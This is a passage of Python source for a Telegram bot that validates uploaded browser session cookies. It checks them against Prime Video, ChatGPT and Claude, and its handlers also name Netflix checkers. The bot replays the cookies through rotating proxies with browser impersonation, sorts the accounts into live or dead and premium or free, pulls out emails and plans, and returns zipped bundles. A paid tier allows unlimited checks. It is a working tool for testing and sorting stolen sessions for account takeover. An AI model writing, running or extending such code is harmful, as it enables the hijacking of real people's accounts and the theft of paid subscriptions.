                           f"# Plan: {det.get('plan','?')}\n# Country: {det.get('country','?')}\n"
                           f"# Payment: {det.get('payment_method') or 'None'}\n"
                           f"# Account: {det.get('account_name') or 'None'}\n"
                           f"# Checked: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    zf.writestr(f"{tier}/{country}/cookie_{idx:03d}.txt", hdr+e["raw"].strip()+"\n")
        dead_lines = [f"# DEAD | {e['label']} | {e['error']}\n{e['raw']}\n" for e in dead_entries]
        zf.writestr("dead/dead_cookies.txt","\n".join(dead_lines) or "# No dead cookies\n")
        zf.writestr("report.txt","\n".join(report_lines))
    buf.seek(0)
    return buf

async def run_prime(cookie_files, msg, cancel):
    all_accs = []
    report   = [f"PRIME VIDEO CHECK — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"]
    total    = 0
    for fname,content in cookie_files:
        accs = pv_extract_accounts(content,fname); total+=len(accs); all_accs.extend(accs)
        report.append(f"[FILE] {fname} — {len(accs)} account(s)")
    live_entries=[]; dead_entries=[]
    stats={"total":total,"alive":0,"dead":0,"dup":0,"paid":0,"free":0,"checked":0}
    known_ubids=set(); loop=asyncio.get_event_loop()
    for a in all_accs:
        if cancel.is_set(): break
        cd   = pv_parse(a["raw"])
        ubid = cd.get("ubid-main-av") or cd.get("ubid-main")
        if ubid and ubid in known_ubids:
            stats["dup"]+=1; stats["checked"]+=1; report.append(f"  [DUP] {a['label']}")
        else:
            if ubid: known_ubids.add(ubid)
            chk = await loop.run_in_executor(None, pv_validate, cd)
            if chk["valid"]:
                det = await loop.run_in_executor(None, pv_fetch_details, cd)
                stats["alive"]+=1
                if det.get("is_subscribed"): stats["paid"]+=1
                else: stats["free"]+=1
                live_entries.append({"raw":a["raw"],"det":det,"label":a["label"]})
                report.append(f"  [LIVE] {a['label']} | {det.get('plan')} | {det.get('country')}")
            else:
                stats["dead"]+=1
                dead_entries.append({"label":a["label"],"error":chk.get("error","expired"),"raw":a["raw"]})
                report.append(f"  [DEAD] {a['label']}")
            stats["checked"]+=1
        if stats["checked"]%5==0 or stats["checked"]==total:
            try:
                await msg.edit_text(
                    f"⏳ <b>Prime Video...</b>\n{make_bar(stats['checked'],total)}\n"
                    f"📊 {stats['checked']}/{total}\n"
                    f"🟢<code>{stats['alive']}</code>  ❌<code>{stats['dead']}</code>  💳<code>{stats['paid']}</code>  🆓<code>{stats['free']}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            except Exception: pass
    return pv_build_zip(live_entries,dead_entries,report), stats

# ══════════════════════════════════════════════════════════════════════════════
#  CHECKER 4 — CHATGPT
# ══════════════════════════════════════════════════════════════════════════════

class ChatGPTService:
    SESSION_API      = "https://chatgpt.com/api/auth/session"
    ME_API           = "https://chatgpt.com/backend-api/me"
    CONV_API         = "https://chatgpt.com/backend-api/conversations?offset=0&limit=1&order=updated"
    SUBSCRIPTION_API = "https://chatgpt.com/backend-api/subscription"
    HDRS = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
        "Accept":"application/json, text/plain, */*","Accept-Language":"en-US,en;q=0.9",
        "Referer":"https://chatgpt.com/","Origin":"https://chatgpt.com",
        "sec-ch-ua":'"Chromium";v="122", "Not(A:Brand";v="24"',"sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":'"Windows"',"Sec-Fetch-Dest":"empty",
        "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin",
    }
    def parse_netscape(self,text):
        ck={}
        for line in text.splitlines():
            line=line.strip()
            if not line or line.startswith("#"): continue
            parts=line.split("\t")
            if len(parts)>=7:
                n,v=parts[5].strip(),parts[6].strip()
                if n and v: ck[n]=v
        return ck
    def has_valid(self,ck): return any(k.startswith("__Secure-next-auth.session-token") for k in ck)
    def _decode_jwt(self,token):
        try:
            payload=token.split(".")[1]; payload+="="*(4-len(payload)%4)
            return json.loads(base64.urlsafe_b64decode(payload))
        except Exception: return {}
    def _parse_plan(self,user,account,me_data,sub_data,jwt_payload):
        jwt_auth  = jwt_payload.get("https://api.openai.com/auth",{}) or {}
        acct_plan = str(account.get("planType") or account.get("plan_type") or "").lower()
        jwt_plan  = str(jwt_auth.get("chatgpt_plan_type") or "").lower()
        all_grps  = (user.get("groups") or [])+(jwt_auth.get("groups") or [])
        sub_plan  = str(sub_data.get("plan_type") or sub_data.get("name") or "").lower()
        me_plan   = str(me_data.get("plan_type") or "").lower()
        def mp(p):
            if not p: return None
            if "enterprise" in p: return "Enterprise"
            if "team" in p: return "Team"
            if "pro" in p and "plus" not in p: return "Pro"
            if "plus" in p: return "Plus"
            if p=="go" or "chatgptgo" in p: return "Go"
            return None
        for src in [acct_plan,jwt_plan]:
            r=mp(src);
            if r: return r
        for g in all_grps:
            r=mp(g.lower());
            if r: return r
        r=mp(f"{sub_plan} {me_plan}");
        if r: return r
        if me_data.get("chatgpt_plus_user"): return "Plus"
        return "Free"
    async def _req(self,url,cookies,extra_hdrs=None):
        proxy = await PROXY_MGR.next() if PROXY_MGR else None
        hdrs  = {**self.HDRS,**(extra_hdrs or {})}
        try:
            async with AsyncSession(impersonate="chrome120",
                proxies={"http":proxy,"https":proxy} if proxy else None) as s:
                return await s.request("GET",url,cookies=cookies,headers=hdrs,timeout=15,allow_redirects=True)
        except Exception: return None
    async def validate(self,cookies):
        if not cookies or not self.has_valid(cookies): return None,None,None
        resp=await self._req(self.SESSION_API,cookies)
        if not resp or resp.status_code!=200: return None,None,None
        try: data=resp.json()
        except Exception: return None,None,None
        if not data or not data.get("accessToken") or not data.get("user"): return None,None,None
        at=data["accessToken"]; jwt_p=self._decode_jwt(at); auth_h={"Authorization":f"Bearer {at}"}
        resp2=await self._req(self.CONV_API,cookies,auth_h)
        if not resp2 or resp2.status_code!=200: return None,None,None
        try: conv=resp2.json()
        except Exception: return None,None,None
        if conv.get("detail") or "items" not in conv: return None,None,None
        me_data=sub_data={}
        r3=await self._req(self.ME_API,cookies,auth_h)
        if r3 and r3.status_code==200:
            try: me_data=r3.json() or {}
            except Exception: pass
        r4=await self._req(self.SUBSCRIPTION_API,cookies,auth_h)
        if r4 and r4.status_code==200:
            try: sub_data=r4.json() or {}
            except Exception: pass
        account=data.get("account") or {}
        plan=self._parse_plan(data["user"],account,me_data,sub_data,jwt_p)
        email=data["user"].get("email") or me_data.get("email") or ""
        return plan, email, plan not in ("Free","")

_gpt_svc = ChatGPTService()

async def run_chatgpt(cookie_files, msg, cancel):
    total=len(cookie_files); premium=[]; free_list=[]; dead=0; done=0; sem=asyncio.Semaphore(20)
    async def check_one(fname,content):
        nonlocal dead,done
        if cancel.is_set(): done+=1; return
        async with sem:
            cookies=_gpt_svc.parse_netscape(content)
            plan,email,is_prem=await _gpt_svc.validate(cookies)
            done+=1
            if plan is None: dead+=1
            elif is_prem: premium.append((fname,content,plan,email))
            else: free_list.append((fname,content,plan,email))
        if done%5==0 or done==total:
            try:
                await msg.edit_text(
                    f"⏳ <b>ChatGPT...</b>\n{make_bar(done,total)}\n"
                    f"📦 {done}/{total}  ✅<code>{len(premium)}</code>  🟡<code>{len(free_list)}</code>  ❌<code>{dead}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            except Exception: pass
    await asyncio.gather(*[check_one(fn,ct) for fn,ct in cookie_files])
    buf=BytesIO()
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as zf:
        for fname,content,plan,email in premium:
            zf.writestr(f"premium/{plan}/{os.path.basename(fname)}",
                        f"{WATERMARK}\n– Email: {email}\n– Plan: {plan}\n\n{content}")
        for fname,content,plan,email in free_list:
            zf.writestr(f"free/{os.path.basename(fname)}",
                        f"{WATERMARK}\n– Email: {email}\n– Plan: {plan}\n\n{content}")
    buf.seek(0)
    return buf, {"total":total,"premium":len(premium),"free":len(free_list),"dead":dead}

# ══════════════════════════════════════════════════════════════════════════════
#  CHECKER 5 — CLAUDE
# ══════════════════════════════════════════════════════════════════════════════

class ClaudeService:
    SESSION_API = "https://claude.ai/api/auth/session"
    ACCOUNT_API = "https://claude.ai/api/account"
    HDRS = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
        "Accept":"application/json, text/plain, */*","Accept-Language":"en-US,en;q=0.9",
        "Referer":"https://claude.ai/","Origin":"https://claude.ai",
        "sec-ch-ua":'"Chromium";v="122", "Not(A:Brand";v="24"',"sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":'"Windows"',"Sec-Fetch-Dest":"empty",
        "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin",
    }
    def parse_netscape(self,text):
        ck={}
        for line in text.splitlines():
            line=line.strip()
            if not line or line.startswith("#"): continue
            parts=line.split("\t")
            if len(parts)>=7:
                n,v=parts[5].strip(),parts[6].strip()
                if n and v: ck[n]=v
        return ck
    def has_valid(self,ck):
        return any(k.startswith("__Secure-next-auth.session-token") for k in ck) or "sessionKey" in ck
    def _build_netscape(self,cookies):
        return "\n".join(f".claude.ai\tTRUE\t/\tTRUE\t1999999999\t{n}\t{v}" for n,v in cookies.items())
    def format_result(self,email,plan,active,cookies):
        return (f"{WATERMARK}\n– Email: {email}\n– Plan: {plan.lower()}\n"
                f"– Active: {'true' if active else 'false'}\n– Cookies:\n{self._build_netscape(cookies)}\n")
    async def _req(self,url,cookies):
        proxy = await PROXY_MGR.next() if PROXY_MGR else None
        try:
            async with AsyncSession(impersonate="chrome120",
                proxies={"http":proxy,"https":proxy} if proxy else None) as s:
                return await s.request("GET",url,cookies=cookies,headers=self.HDRS,timeout=15,allow_redirects=True)
        except Exception: return None
    def _build_result(self,user,data,cookies):
        email  = user.get("email") or user.get("email_address") or data.get("email") or ""
        subs   = user.get("subscriptions") or data.get("subscriptions") or []
        has_pro= bool(subs or user.get("has_claude_pro") or data.get("has_claude_pro") or
                      user.get("plan","").lower() in ("pro","claude_pro") or data.get("account_subscription"))
        plan   = "Pro" if has_pro else "Free"
        return plan, email, has_pro, self.format_result(email,plan,bool(email),cookies)
    async def validate(self,cookies):
        if not cookies or not self.has_valid(cookies): return None,None,None,None
        has_sec = any(k.startswith("__Secure-next-auth.session-token") for k in cookies)
        url     = self.SESSION_API if has_sec else self.ACCOUNT_API
        resp    = await self._req(url,cookies)
        if not resp or resp.status_code!=200: return None,None,None,None
        try: data=resp.json()
        except Exception: return None,None,None,None
        if not data: return None,None,None,None
        user = data.get("user") or data
        return self._build_result(user,data,cookies)

_claude_svc = ClaudeService()

async def run_claude(cookie_files, msg, cancel):
    total=len(cookie_files); premium=[]; free_list=[]; dead=0; done=0; sem=asyncio.Semaphore(20)
    async def check_one(fname,content):
        nonlocal dead,done
        if cancel.is_set(): done+=1; return
        async with sem:
            cookies=_claude_svc.parse_netscape(content)
            plan,email,is_pro,formatted=await _claude_svc.validate(cookies)
            done+=1
            if plan is None: dead+=1
            elif is_pro: premium.append((fname,formatted))
            else: free_list.append((fname,formatted))
        if done%5==0 or done==total:
            try:
                await msg.edit_text(
                    f"⏳ <b>Claude...</b>\n{make_bar(done,total)}\n"
                    f"📦 {done}/{total}  ✅<code>{len(premium)}</code>  🟡<code>{len(free_list)}</code>  ❌<code>{dead}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            except Exception: pass
    await asyncio.gather(*[check_one(fn,ct) for fn,ct in cookie_files])
    buf=BytesIO()
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as zf:
        for fname,formatted in premium:
            zf.writestr(f"premium/{os.path.basename(fname)}", formatted.encode())
        for fname,formatted in free_list:
            zf.writestr(f"free/{os.path.basename(fname)}", formatted.encode())
    buf.seek(0)
    return buf, {"total":total,"premium":len(premium),"free":len(free_list),"dead":dead}

# ══════════════════════════════════════════════════════════════════════════════
#  TELEGRAM HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

async def show_main_menu(target, edit=False):
    uid  = None
    if hasattr(target,"from_user") and target.from_user:
        uid = target.from_user.id
    elif hasattr(target,"effective_user") and target.effective_user:
        uid = target.effective_user.id
    tier = await db_get_tier(uid) if uid else "free"
    text = build_main_menu_text(tier)
    if edit:
        try: await target.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()); return
        except Exception: pass
    if hasattr(target,"reply_text"):
        await target.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
    elif hasattr(target,"message") and target.message:
        await target.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())

# ── /start ────────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    await db_upsert_user(u.id, u.username or "", u.first_name or "")
    await show_main_menu(update.message)

# ── /addpremium <uid> [days] ──────────────────────────────────────────────────
async def cmd_addpremium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    args = ctx.args
    if not args:
        await update.message.reply_text(
            "Usage:\n<code>/addpremium &lt;uid&gt;</code> — lifetime\n"
            "<code>/addpremium &lt;uid&gt; &lt;days&gt;</code> — timed",
            parse_mode=ParseMode.HTML)
        return
    try:
        target_uid = int(args[0])
        days       = int(args[1]) if len(args)>1 else None
    except ValueError:
        await update.message.reply_text("❌ Invalid arguments.")
        return
    await db_set_premium(target_uid, days, update.effective_user.id)
    expiry_str = f"{days} days" if days else "Lifetime"
    await update.message.reply_text(
        f"✅ <b>Premium granted</b>\n"
        f"UID     : <code>{target_uid}</code>\n"
        f"Expires : <code>{expiry_str}</code>",
        parse_mode=ParseMode.HTML)
    # notify target user if possible
    try:
        await ctx.bot.send_message(
            chat_id=target_uid,
            text=(f"🎉 <b>Premium Activated!</b>\n\n"
                  f"Tumhara plan upgrade ho gaya ⭐ Premium\n"
                  f"Expiry: <code>{expiry_str}</code>\n\n"
                  f"Ab unlimited cookies check kar sakte ho!"),
            parse_mode=ParseMode.HTML)
    except Exception:
        pass

# ── /removepremium <uid> ──────────────────────────────────────────────────────
async def cmd_removepremium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    args = ctx.args
    if not args:
        await update.message.reply_text("Usage: <code>/removepremium &lt;uid&gt;</code>", parse_mode=ParseMode.HTML)
        return
    try: target_uid = int(args[0])
    except ValueError: await update.message.reply_text("❌ Invalid UID."); return
    await db_remove_premium(target_uid)
    await update.message.reply_text(
        f"✅ Premium removed for <code>{target_uid}</code>", parse_mode=ParseMode.HTML)

# ── /mystatus ─────────────────────────────────────────────────────────────────
async def cmd_mystatus(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u    = update.effective_user
    await db_upsert_user(u.id, u.username or "", u.first_name or "")
    tier = await db_get_tier(u.id)
    badge= tier_badge(tier)
    loop = asyncio.get_event_loop()
    row  = await loop.run_in_executor(None, _db_get_sub, u.id)
    exp  = row["expires_at"] if row else None
    limit_str = f"<code>{FREE_COOKIE_LIMIT}</code> per check" if tier=="free" else "Unlimited ✨"
    exp_str   = exp if exp else ("Lifetime" if tier in ("premium","admin") else "—")
    await update.message.reply_text(
        f"👤 <b>Your Status</b>\n\n"
        f"UID    : <code>{u.id}</code>\n"
        f"Plan   : {badge}\n"
        f"Limit  : {limit_str}\n"
        f"Expiry : <code>{exp_str}</code>",
        parse_mode=ParseMode.HTML, reply_markup=back_kb())

# ── /users  (admin) ───────────────────────────────────────────────────────────
async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    loop  = asyncio.get_event_loop()
    rows  = await loop.run_in_executor(None, _db_all_users)
    stats = await loop.run_in_executor(None, _db_stats)
    lines = [
        f"📊 <b>Bot Stats</b>\n"
        f"Total users  : <code>{stats['total']}</code>\n"
        f"Premium      : <code>{stats['premium']}</code>\n"
        f"Total checks : <code>{stats['checks']}</code>\n"
        f"Total cookies: <code>{stats['cookies']}</code>\n\n"
        f"<b>Recent users (max 50):</b>"
    ]
    for r in rows:
        badge = "⭐" if r["tier"]=="premium" else "🆓"
        uname = f"@{r['username']}" if r["username"] else r["first_name"] or "?"
        exp   = f" (exp: {r['expires_at'][:10]})" if r["expires_at"] else ""
        lines.append(f"{badge} <code>{r['uid']}</code> — {uname}{exp}")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

# ── /broadcast <msg>  (admin) ─────────────────────────────────────────────────
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    if not ctx.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    text  = " ".join(ctx.args)
    loop  = asyncio.get_event_loop()
    rows  = await loop.run_in_executor(None, _db_all_users)
    ok = fail = 0
    for r in rows:
        try:
            await ctx.bot.send_message(chat_id=r["uid"], text=text)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await update.message.reply_text(f"📢 Broadcast done\n✅ {ok}  ❌ {fail}")

# ── callback query ─────────────────────────────────────────────────────────────
async def cb_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q: CallbackQuery = update.callback_query
    await q.answer()
    data = q.data
    u    = q.from_user

    if data == "menu_start":
        ctx.user_data.pop(KEY_ACTIVE_CHECKER, None)
        await db_upsert_user(u.id, u.username or "", u.first_name or "")
        await show_main_menu(q.message, edit=True)
        return

    if data == "stop_checker":
        ev = ctx.user_data.get(KEY_CANCEL_EVENT)
        if isinstance(ev, asyncio.Event): ev.set()
        ctx.user_data.pop(KEY_ACTIVE_CHECKER, None)
        try:
            await q.message.edit_text("🛑 <b>Stop signal sent.</b>",
                parse_mode=ParseMode.HTML, reply_markup=back_kb())
        except Exception: pass
        return

    if data.startswith("run_"):
        checker = data[len("run_"):]
        if checker in ("crunchyroll","hotstar"):
            await q.message.edit_text(
                f"⚠️ <b>{checker.title()} Checker</b> — coming soon!",
                parse_mode=ParseMode.HTML, reply_markup=back_kb())
            return
        ctx.user_data[KEY_ACTIVE_CHECKER] = checker
        names = {
            CHECKER_NFBULK:"🎬 Netflix Bulk", CHECKER_NFTOKEN:"🔑 NF Token",
            CHECKER_PRIME:"🎥 Prime Video", CHECKER_CHATGPT:"🤖 ChatGPT",
            CHECKER_CLAUDE:"🧠 Claude",
        }
        tier  = await db_get_tier(u.id)
        limit = FREE_COOKIE_LIMIT if tier=="free" else "Unlimited"
        await q.message.edit_text(
            f"<b>{names.get(checker,checker)} Checker</b>\n\n"
            f"Plan  : {tier_badge(tier)}\n"
            f"Limit : <code>{limit}</code> cookies/check\n\n"
            f"📤 Ab apna <code>.txt</code> ya <code>.zip</code> file bhejo.",
            parse_mode=ParseMode.HTML, reply_markup=back_kb())

# ── document handler ───────────────────────────────────────────────────────────
async def file_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc: return

    u       = update.effective_user
    checker = ctx.user_data.get(KEY_ACTIVE_CHECKER)
    if not checker:
        await update.message.reply_text("Pehle menu se ek checker choose karo.",
            reply_markup=main_menu_kb())
        return

    fname = doc.file_name or ""
    ext   = os.path.splitext(fname)[1].lower()
    if ext not in (".txt",".zip"):
        await update.message.reply_text(
            "❌ Only <code>.txt</code> or <code>.zip</code> supported.",
            parse_mode=ParseMode.HTML, reply_markup=back_kb())
        return

    # register user
    await db_upsert_user(u.id, u.username or "", u.first_name or "")
    tier  = await db_get_tier(u.id)
    limit = await get_limit(u.id)   # None = unlimited

    msg = await update.message.reply_text("⏬ Downloading...")
    raw = await download_file(ctx.bot, doc)
    if not raw:
        await msg.edit_text("❌ Download failed.", reply_markup=back_kb())
        return

    if ext == ".zip":
        cookie_files = extract_zip_txts(raw)
        if not cookie_files:
            await msg.edit_text("❌ ZIP mein koi readable .txt nahi mili.", reply_markup=back_kb())
            return
    else:
        content      = raw.decode("utf-8", errors="ignore")
        cookie_files = [(fname, content)]

    # ── apply limit ──────────────────────────────────────────────────────────
    original_count = len(cookie_files)
    if limit is not None and original_count > limit:
        cookie_files = cookie_files[:limit]
        await update.message.reply_text(
            f"⚠️ <b>Limit reached!</b>\n\n"
            f"Your plan: {tier_badge(tier)}\n"
            f"Limit    : <code>{limit}</code> cookies/check\n"
            f"Uploaded : <code>{original_count}</code> cookies\n\n"
            f"Only first <code>{limit}</code> will be checked.\n"
            f"Upgrade to ⭐ <b>Premium</b> for unlimited checks!",
            parse_mode=ParseMode.HTML)

    cancel = get_cancel(ctx)
    ctx.user_data.pop(KEY_ACTIVE_CHECKER, None)
    ts     = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

    try:
        if checker == CHECKER_NFBULK:
            await msg.edit_text(f"🎬 <b>Netflix Bulk</b> — {len(cookie_files)} files...",
                parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            zip_buf,counter,hits = await run_nfbulk(cookie_files, msg, cancel)
            await db_log_check(u.id, checker, len(cookie_files))
            summary = (
                f"{'🛑 Stopped' if cancel.is_set() else '✅ Done'} — <b>Netflix Bulk</b>\n\n"
                f"{make_bar(sum(counter.values()),len(cookie_files))}\n"
                f"📦 Total : <code>{len(cookie_files)}</code>\n"
                f"✅ Alive : <code>{counter['hit']}</code>\n"
                f"❌ Dead  : <code>{counter['dead']}</code>\n"
                f"⚠️ No ID : <code>{counter['err']}</code>"
            )
            await msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=back_kb())
            if hits:
                await update.message.reply_document(document=zip_buf,
                    filename=f"netflix_bulk_{ts}.zip", caption=f"🎬 Netflix — {hits} alive")

        elif checker == CHECKER_NFTOKEN:
            await msg.edit_text(f"🔑 <b>NF Token</b> — {len(cookie_files)} files...",
                parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            zip_buf,counter = await run_nftoken(cookie_files, msg, cancel)
            await db_log_check(u.id, checker, len(cookie_files))
            summary = (
                f"{'🛑 Stopped' if cancel.is_set() else '✅ Done'} — <b>NF Token</b>\n\n"
                f"{make_bar(counter['done'],len(cookie_files))}\n"
                f"📦 Total : <code>{len(cookie_files)}</code>\n"
                f"✅ Alive : <code>{counter['alive']}</code>\n"
                f"❌ Dead  : <code>{counter['dead']}</code>"
            )
            await msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=back_kb())
            if counter["alive"]:
                await update.message.reply_document(document=zip_buf,
                    filename=f"nftoken_{ts}.zip", caption=f"🔑 NF Token — {counter['alive']} valid")

        elif checker == CHECKER_PRIME:
            await msg.edit_text(f"🎥 <b>Prime Video</b> — {len(cookie_files)} files...",
                parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            zip_buf,stats = await run_prime(cookie_files, msg, cancel)
            await db_log_check(u.id, checker, len(cookie_files))
            summary = (
                f"{'🛑 Stopped' if cancel.is_set() else '✅ Done'} — <b>Prime Video</b>\n\n"
                f"{make_bar(stats['checked'],stats['total'])}\n"
                f"📊 {stats['checked']}/{stats['total']}\n"
                f"🟢 Live : <code>{stats['alive']}</code>  ❌ Dead: <code>{stats['dead']}</code>\n"
                f"💳 Paid : <code>{stats['paid']}</code>  🆓 Free: <code>{stats['free']}</code>"
            )
            await msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=back_kb())
            if stats["alive"]:
                await update.message.reply_document(document=zip_buf,
                    filename=f"prime_{ts}.zip", caption=f"🎥 Prime — {stats['alive']} live")

        elif checker == CHECKER_CHATGPT:
            await msg.edit_text(f"🤖 <b>ChatGPT</b> — {len(cookie_files)} files...",
                parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            zip_buf,stats = await run_chatgpt(cookie_files, msg, cancel)
            await db_log_check(u.id, checker, len(cookie_files))
            summary = (
                f"{'🛑 Stopped' if cancel.is_set() else '✅ Done'} — <b>ChatGPT</b>\n\n"
                f"{make_bar(stats['total']-stats['dead'],stats['total'])}\n"
                f"📦 Total   : <code>{stats['total']}</code>\n"
                f"✅ Premium : <code>{stats['premium']}</code>\n"
                f"🟡 Free    : <code>{stats['free']}</code>\n"
                f"❌ Dead    : <code>{stats['dead']}</code>"
            )
            await msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=back_kb())
            if stats["premium"]+stats["free"]:
                await update.message.reply_document(document=zip_buf,
                    filename=f"chatgpt_{ts}.zip",
                    caption=f"🤖 ChatGPT — {stats['premium']} premium, {stats['free']} free")

        elif checker == CHECKER_CLAUDE:
            await msg.edit_text(f"🧠 <b>Claude</b> — {len(cookie_files)} files...",
                parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            zip_buf,stats = await run_claude(cookie_files, msg, cancel)
            await db_log_check(u.id, checker, len(cookie_files))
            summary = (
                f"{'🛑 Stopped' if cancel.is_set() else '✅ Done'} — <b>Claude</b>\n\n"
                f"{make_bar(stats['total']-stats['dead'],stats['total'])}\n"
                f"📦 Total : <code>{stats['total']}</code>\n"
                f"✅ Pro   : <code>{stats['premium']}</code>\n"
                f"🟡 Free  : <code>{stats['free']}</code>\n"
                f"❌ Dead  : <code>{stats['dead']}</code>"
            )
            await msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=back_kb())
            if stats["premium"]+stats["free"]:
                await update.message.reply_document(document=zip_buf,
                    filename=f"claude_{ts}.zip",
                    caption=f"🧠 Claude — {stats['premium']} pro, {stats['free']} free")

    except Exception as e:
        log.exception(f"Checker {checker} crashed: {e}")
        await msg.edit_text(f"❌ Error: <code>{e}</code>", parse_mode=ParseMode.HTML,
            reply_markup=back_kb())

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[ERROR] BOT_TOKEN set karo pehle!")
        sys.exit(1)

    db_init()
    log.info(f"DB initialized: {DB_PATH}")
    if PROXY_MGR:
        log.info(f"Proxies loaded: {len(PROXY_MGR.proxies)}")

    req = HTTPXRequest(
        connect_timeout=CONNECT_TIMEOUT, read_timeout=READ_TIMEOUT,
        write_timeout=WRITE_TIMEOUT, pool_timeout=POOL_TIMEOUT,
    )
    app = (Application.builder().token(BOT_TOKEN).request(req)
           .concurrent_updates(True).build())

    app.add_handler(CommandHandler("start",          cmd_start))
    app.add_handler(CommandHandler("addpremium",     cmd_addpremium))
    app.add_handler(CommandHandler("removepremium",  cmd_removepremium))
    app.add_handler(CommandHandler("mystatus",       cmd_mystatus))
    app.add_handler(CommandHandler("users",          cmd_users))
    app.add_handler(CommandHandler("broadcast",      cmd_broadcast))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))

    log.info("Bot started.")
    # ✅ Direct call, no asyncio.run()
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
